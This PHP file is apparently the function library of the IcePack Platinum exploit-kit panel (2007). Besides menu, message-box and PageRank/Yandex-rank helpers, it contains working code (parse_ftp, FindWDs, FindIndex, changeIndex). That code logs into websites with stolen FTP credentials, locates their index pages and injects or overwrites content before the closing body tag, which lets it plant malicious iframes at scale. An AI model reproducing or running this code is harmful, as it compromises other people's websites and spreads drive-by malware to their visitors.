<?php
/*~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	IcePack Platinum Edition
-----------------------------------------------------
	2007 (c) IDT Group
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~*/

function MessageBox($title, $message)
{
	if ($title == "0") $title = "Ошибка";
	if ($title == "1") $title = "Информация";
	?>
	<div class="box">
		<div class="alert"><?=$title;?></div>
		<div class="itemWrapper"><?=$message;?></div>
	</div>
</div>
<?
ShowCopyright();

return exit();
}

function ShowHelp($text)
{
	$result = "<font class=\"qhelp\">[<a href=\"javascript:void(0);\" onmouseover=\"return overlib('".$text."',0,CAPTION,'Справка',CENTER);\" onmouseout=\"return nd();\">?</a>]</font>";
	
	return $result;
}

function ShowCopyright()
{
	echo '
<div class="copyright">
'.date("Y").' &copy; IDT Group and BlackSun <a href="http://stars-team.org.ru" target="_blank">[S.T.A.R.S. Team]</a><a href="http://forum.xaknet.ru" target="_blank">[XakNet Team]</a>
</div>
';
}

function abc($int)
{ $pos = strpos($int, '.'); return substr($int, 0, $pos+3); }

function ShowMenu($i)
{
	?>
											var menu<?=$i;?> = new MENU("top");
											menu<?=$i;?>.floatMenu = false;
											menu<?=$i;?>.mainArrows = false;
											menu<?=$i;?>.mainBGColor = "#FFFFFF";
											menu<?=$i;?>.mainBorderWidth = 1;
											menu<?=$i;?>.mainItemWidth = 115;
											menu<?=$i;?>.mainItemFontSize = 11;
											menu<?=$i;?>.mainItem3D = 0;
											menu<?=$i;?>.mainItemColor = "#91cefa";
											menu<?=$i;?>.mainItemFontColor = "#FFFFFF";
											menu<?=$i;?>.mainItemHilight = "#a2cfef";
											menu<?=$i;?>.subBGColor = "#FFFFFF";
											menu<?=$i;?>.subItemWidth = 115;
											menu<?=$i;?>.subItemColor = "#FFFFFF";
											menu<?=$i;?>.subItemHilight = "#EEEEEE";	
	<?
}

function CheckCountry ($name)
{
	global $_POST, $total;
	
	if (isset($_POST[$name])) $total .= $name.','; else $total .= ',';
	
	return "";
}

function parse_ftp($account)
{
	$ftp_login = "";
	$ftp_pass  = "";

	$account = eregi_replace("\n|\r|ftp://","",trim($account));
	$ftp_server = str_replace("/","",substr($account,strrpos($account,"@")+1));
	$loginpass = substr($account,0,strrpos($account,"@"));
	@list($ftp_login,$ftp_pass)=@explode(":",$loginpass,2);

	return array('serv' => $ftp_server,'login' => $ftp_login,'pass' => $ftp_pass);
}

function FindIndex($path, $rec=0)
{
	global $cid, $Indexs;

	$indexfiles = array("index\.(.*)", "main.tpl");

	$ls = ftp_rawlist($cid, $path);

	foreach($ls as $raw)
	{
		$fn = trim (substr ($raw, strrpos($raw," ")));
		if ($rec < 3 )
		{
			if(substr($raw,0,1) == "d" && ($fn != "." && $fn != ".."))
			{
				FindIndex($path."/".$fn,$rec + 1);
			}
		}
		if($sp=strrpos($fn, "/")) $fn=substr($fn, $sp + 1);


		foreach($indexfiles as $if)
		{
			if(eregi($if, $fn)) $Indexs[] = $path."/".$fn;
		}
	}
}

function FindWDs($dir)
{
	global $cid,$Indexs, $WDs;

	$webDirs=array('public_html','htdocs','httpdocs','docs','site','www','http');
	$ls = ftp_rawlist($cid, $dir);

	foreach($ls as $raw)
	{
		$fn = trim(substr($raw, strrpos($raw," ")));

		if (substr($fn,strlen($fn)-1) == "/") $fn = substr($fn,0, strlen($fn) - 1);
		if( $sp = strrpos($fn,"/")) $fn=substr($fn, $sp + 1);

		if (substr($raw[0],0,1) == "d")
		{
			if (in_array(strtolower($fn), $webDirs))
			{
				$WDs[] = $dir."/".$fn;

				FindIndex ($dir."/".$fn);
				FindWDs   ($dir."/".$fn);
			}
		}
	}
}

function changeIndex($file, $text)
{
	global $cid, $method, $rm_frame;
	
	$t2f = "</body>";
	$t2r = "<!-- + -->" . $text . "<!-- + -->\r\n</body>";

	@ftp_get($cid, "./tmp/data", $file, FTP_ASCII);

	$data = @file_get_contents("./tmp/data");
	

	if ($rm_frame == "1") $data = eregi_replace("<iframe","<!--iframe",eregi_replace("iframe>","iframe-->",$data));
	
	if ($method == "afterbody") $data = str_replace($t2f, $t2r, $data);
	if ($method == "attend") $data .= "\r\n<!-- + -->" . $text . "<!-- + -->";
	if ($method == "rewrite") $data = $text;

	@fwrite(fopen("./tmp/data","w"), $data);
	@ftp_put($cid, $file, "./tmp/data", FTP_ASCII);

	return true;
}


   define('GOOGLE_MAGIC', 0xE6359A60);

   function zeroFill($a, $b)
   {
      $z = hexdec(80000000);
      if($z & $a)
      {
         $a = ($a>>1);
         $a &= (~$z);
         $a |= 0x40000000;
         $a = ($a>>($b-1));
      }
      else { $a = ($a>>$b); }
      return $a;
   }

   function mix($a,$b,$c) 
   {
      $a -= $b; $a -= $c; $a ^= (zeroFill($c,13));
      $b -= $c; $b -= $a; $b ^= ($a<<8);
      $c -= $a; $c -= $b; $c ^= (zeroFill($b,13));
      $a -= $b; $a -= $c; $a ^= (zeroFill($c,12));
      $b -= $c; $b -= $a; $b ^= ($a<<16);
      $c -= $a; $c -= $b; $c ^= (zeroFill($b,5));
      $a -= $b; $a -= $c; $a ^= (zeroFill($c,3));
      $b -= $c; $b -= $a; $b ^= ($a<<10);
      $c -= $a; $c -= $b; $c ^= (zeroFill($b,15));
      return array($a,$b,$c);
   }

   function GoogleCH($urlpage, $length=null, $init=GOOGLE_MAGIC) 
   {
      if(is_null($length)) { $length = sizeof($urlpage); }
      $a = $b = 0x9E3779B9;
      $c = $init;
      $k = 0;
      $len = $length;

      while($len >= 12) 
      {
         $a += ($urlpage[$k+0] + ($urlpage[$k+1]<<8) + ($urlpage[$k+2]<<16) + ($urlpage[$k+3]<<24));
         $b += ($urlpage[$k+4] + ($urlpage[$k+5]<<8) + ($urlpage[$k+6]<<16) + ($urlpage[$k+7]<<24));
         $c += ($urlpage[$k+8] + ($urlpage[$k+9]<<8) + ($urlpage[$k+10]<<16)+ ($urlpage[$k+11]<<24));
         $mix = mix($a,$b,$c);
         $a = $mix[0]; $b = $mix[1]; $c = $mix[2];
         $k += 12;
         $len -= 12;
      }

      $c += $length;

      switch($len)
      {
         case 11: $c+=($urlpage[$k+10]<<24);
         case 10: $c+=($urlpage[$k+9]<<16);
         case 9 : $c+=($urlpage[$k+8]<<8);
         case 8 : $b+=($urlpage[$k+7]<<24);
         case 7 : $b+=($urlpage[$k+6]<<16);
         case 6 : $b+=($urlpage[$k+5]<<8);
         case 5 : $b+=($urlpage[$k+4]);
         case 4 : $a+=($urlpage[$k+3]<<24);
         case 3 : $a+=($urlpage[$k+2]<<16);
         case 2 : $a+=($urlpage[$k+1]<<8);
         case 1 : $a+=($urlpage[$k+0]);
      }
      $mix = mix($a,$b,$c);
      return $mix[2];
   }

   function strord($string) 
   {
      for($i=0;$i<strlen($string);$i++) 
      {
         $result[$i] = ord($string{$i});
      }
      return $result;
   }

// Функция для определения PR Google

   function pr_google($url) 
   {
      $urlpage = 'info:'.$url;
      $ch = GoogleCH(strord($urlpage));
      $ch = "6$ch";
      $page = @file("http://www.google.com/search?client=navclient-auto&ch=$ch&features=Rank&q=info:".urlencode($url));
      $page = @implode("", $page);

      if(preg_match("/Rank_1:(.):(.+?)\n/is", $page, $res)) { return "$res[2]"; }
      else return "0";
   }

function get_yandex_tic($url, $proxy = '')
{
    if ($url{strlen($url) - 1} == '/' || $url{strlen($url) - 1} == '\\')
        $url = substr($url, 0, -1);

    if (preg_match('/^www\./is', $url))
        $url2 = $url . ',' . substr($url, 4);
    else
        $url2 = 'www.' . $url . ',' . $url;

    $yandex_url = '/yca/cy/ch/' . $url . '/';
    
    $host = 'search.yaca.yandex.ru';
    $result = '';
    if ($proxy == '')
    {
        $fp = @fsockopen($host, 80, $errno, $errstr, 20);
        if ($fp)
        {
            $out = '';
            $out .= "GET $yandex_url HTTP/1.1\r\n";
            $out .= "Host: $host\r\n";
            $out .= "Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-icq, application/x-shockwave-flash, */*\r\n";
            $out .= "Accept-Language: ru\r\n";
            $out .= "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)\r\n";
            $out .= "Connection: Close\r\n\r\n";
            fwrite($fp, $out);
            while (!feof($fp))
               $result .= fgets($fp, 1024);
        
            fclose($fp);
        }
    }
    else
    {
        preg_match('/^(?:http\:\/\/)?(.+)\:(\d{0,5})$/is', $proxy, $arr);
        $ip = $arr[1];
        $port = $arr[2];
        
        $fp = @fsockopen($ip, $port, $errno, $errstr, 20);
        if ($fp)
        {
            $out = '';
            $out .= "GET http://$host$yandex_url HTTP/1.1\r\n";
            $out .= "Host: $host\r\n";
            $out .= "Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-icq, application/x-shockwave-flash, */*\r\n";
            $out .= "Accept-Language: ru\r\n";
            $out .= "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)\r\n";
            $out .= "Connection: Close\r\n\r\n";
            fwrite($fp, $out);
            while (!feof($fp))
               $result .= fgets($fp, 1024);
        
            fclose($fp);
        }
    }
    
    if (preg_match('/индекс цитирования (?:www\.)?(.+?)\s\<\/TITLE\>/is', $result, $arr))
        $url2 = 'www.' . $arr[1] . ',' . $arr[1];
    
    //фильтруем спец. символы preg_*
    $url2 = preg_replace('/([^\w\d]|_)/is', '\\\\\\1', $url2);

    if (preg_match("/$url2\&.+?\>(\d+)\<\/a\>/is", $result, $arr))
        return intval(@$arr[1]);
    else if (preg_match('/Индекс цитирования \(тИЦ\) ресурса..?меньше 10/is', $result))
        return 0;
    else
        return '-';
}

function yandex_tic($url, $proxy = '')
{
    if (!is_array($url))
        $url = array($url);
        
    $tic_arr = array();
    
    foreach ($url as $key => $val)
    {
        if (preg_match('/^http\:\/\//is', $val))
            $val = substr($val, 7);
        
        $url_www = $val;
        if (preg_match('/^www\./is', $val))
            $val = str_replace('www.', '', $val);
        else
            $url_www = 'www.' . $val;
            
        $tic = get_yandex_tic($val, $proxy);
    
        $tic_www = get_yandex_tic($url_www, $proxy);

        if ($tic_www > $tic)
            $tic_arr[] = $tic_www;
        else
            $tic_arr[] = $tic;
    }
    rsort($tic_arr, SORT_NUMERIC);
    return $tic_arr[0];
}

?>